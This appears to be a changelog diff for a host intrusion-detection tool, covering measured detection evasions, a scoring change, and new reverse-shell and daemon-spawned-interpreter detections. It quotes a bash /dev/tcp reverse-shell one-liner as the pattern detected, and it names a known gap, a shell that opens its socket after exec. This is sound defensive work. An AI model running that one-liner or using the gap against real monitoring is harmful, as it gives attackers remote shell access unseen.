@@ -3,7 +3,31 @@
 Notable changes per release. Dates are release dates; the detail behind each
 line is in the commit history.
 
-## v0.5.0 — unreleased
+## v0.5.0 — every documented evasion, measured
+
+`docs/DETECTIONS.md` has always listed the known evasions for each detection.
+None of them had ever been run. This release runs all nine.
+
+**Five were real, and every one produced no event at all** — not a weak signal,
+not a low score: nothing. Two were not evasions; the documentation was simply
+wrong, and those claims are deleted. One was a trade-off that held up under
+measurement. One can be narrowed but not closed, and now says so.
+
+**Scores change in this release, and some incidents will score lower.** The
+chain bonus counted distinct signal *ids*; it now counts distinct *behaviours*.
+Two writes to different login-configuration files were being treated as two
+independent reasons to worry, which scored an ordinary `apt upgrade` at **82,
+HIGH**. If you have tuned thresholds against the old numbers, re-check them.
+
+Two new detections — reverse shells identified by their descriptors, and
+interpreters spawned by network daemons — and enforcement is now tested with
+enforcement actually armed, in both directions.
+
+**Not re-measured for this release:** the alert budget in `docs/PERFORMANCE.md`
+predates every change above, and its throughput figures were taken through a
+startup race that has since been fixed. Both are annotated in place. Read them
+as the shape of the result, not as current counts.
+
 
 ### Login-time persistence is now watched
 
@@ -31,6 +55,43 @@ Per-user rc files (`~/.bashrc`) are deliberately still unwatched. Their owners
 edit them constantly and every editor rewrites them; the detection would drown.
 Package upgrades are the main legitimate writer of the new paths, so baseline the
 package manager as you would for cron and systemd units.
+
+### Reverse shells are detected by their descriptors
+
+The first network-shaped detection, and it needed no network sensor. Measured
+before it existed: connect, `dup2` the socket onto fd 0/1/2, `exec /bin/sh` —
+the sequence every reverse shell one-liner performs — produced **no signal at
+all**.
+
+`shell_from_network_daemon` asks who the parent is, and structurally cannot
+catch this. `bash -i >& /dev/tcp/host/4444 0>&1` has no recognisable daemon in
+its ancestry because it does not need one. What identifies a reverse shell is
+the descriptor, not the lineage: an ordinary shell inherits a tty, a pipe or a
+file.
+
+New signal `socket_backed_shell`, base **70**, set at `sched_process_exec` by
+walking the new program's descriptor table. Three decisions shaped it:
+
+- **The kernel sets a flag; userspace decides what it means.** The BPF side
+  reports only "a standard descriptor is a TCP socket". Which executables make
+  that worth reporting is a userspace question, which keeps the shell list out
+  of the kernel where changing it means reloading the sensor.
+- **AF_UNIX is excluded.** Matching `S_IFSOCK` alone would have caught
+  socketpairs, which are ordinary IPC between cooperating processes. The helper
+  reads the protocol family and requires `AF_INET` or `AF_INET6`.
+- **Restricted to shells**, which is the entire false-positive story. inetd,
+  xinetd and systemd units with `Accept=yes` exec their service with the
+  accepted connection already on fd 0/1/2 — the identical descriptor shape.
+  `tests/noise/inetd_style_service.sh` execs `/bin/date` that way and must stay
+  silent. Interpreters are excluded more sharply still: a socket-activated
+  service written in Python is ordinary.
+
+Not caught, and documented rather than implied: a shell that opens the socket
+itself *after* exec. The descriptor is not a socket when the check runs, which
+is inherent to checking at exec time.
+
+Old captures decode unchanged — the field defaults to absent, which is the
+honest answer for a recording that could not have carried it.
 
 ### The chain bonus counts behaviours, not signal ids
 
